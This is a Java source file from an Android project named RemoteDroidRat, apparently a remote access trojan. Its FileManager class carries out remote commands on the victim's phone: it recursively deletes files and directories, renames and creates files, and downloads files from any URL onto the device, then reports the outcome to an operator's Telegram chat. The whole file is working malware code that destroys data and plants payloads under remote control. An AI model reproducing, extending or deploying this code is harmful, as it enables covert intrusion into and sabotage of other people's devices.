package com.KaranKumar.RemoteDroidRat.commandActions;


import android.content.Context;

import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.InputStream;
import android.os.AsyncTask;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.adminInfo;

public class FileManager {

    private final Context context;
    private TelegramBotApi bot;
    private adminInfo admin; 
    private String ChatID;
    public FileManager(Context context) {
        this.context = context;
        this.bot = new TelegramBotApi(context);
        this.admin = new adminInfo(context);
        this.ChatID = admin.getChatId();
    }

    public void deleteFilePath(String filePath) {
        File file = new File(filePath);
        if (file.exists()) {
            if (file.isDirectory()) {
                deleteDirectory(file);
            } else {
                file.delete();
            }
        }
    }

    private void deleteDirectory(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    file.delete();
                }
            }
        }
        directory.delete();
    }

    public void renameFilePath(String oldPath, String newPath) {
        File oldFile = new File(oldPath);
        File newFile = new File(newPath);
        if (oldFile.exists() && !newFile.exists()) {
            oldFile.renameTo(newFile);
        }
    }

    public void createFilePath(String filePath) {
        File file = new File(filePath);
        if (!file.exists()) {
            if (file.isDirectory()) {
                file.mkdirs();
            } else {
                try {
                    file.createNewFile();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }


    public void downloadFile(String path, String url) {
        new DownloadFileTask().execute(path, url);
    }

    private class DownloadFileTask extends AsyncTask<String, Void, Boolean> {

        @Override
        protected Boolean doInBackground(String... params) {
            String path = params[0];
            String url = params[1];

            try {
                URL downloadUrl = new URL(url);
                HttpURLConnection connection = (HttpURLConnection) downloadUrl.openConnection();
                connection.connect();

                int responseCode = connection.getResponseCode();

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    InputStream inputStream = connection.getInputStream();
                    FileOutputStream outputStream = new FileOutputStream(path);

                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        outputStream.write(buffer, 0, bytesRead);
                    }

                    outputStream.close();
                    inputStream.close();
                    return true;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            return false;
        }

        @Override
        protected void onPostExecute(Boolean success) {
            if (success) {
                // File downloaded successfully
                bot.sendMessage(ChatID, "File successfully Downloded of given url.");
            } else {
                // Error handling for download failure
                bot.sendMessage(ChatID, "File Download failed.");
            }
        }
    }
}
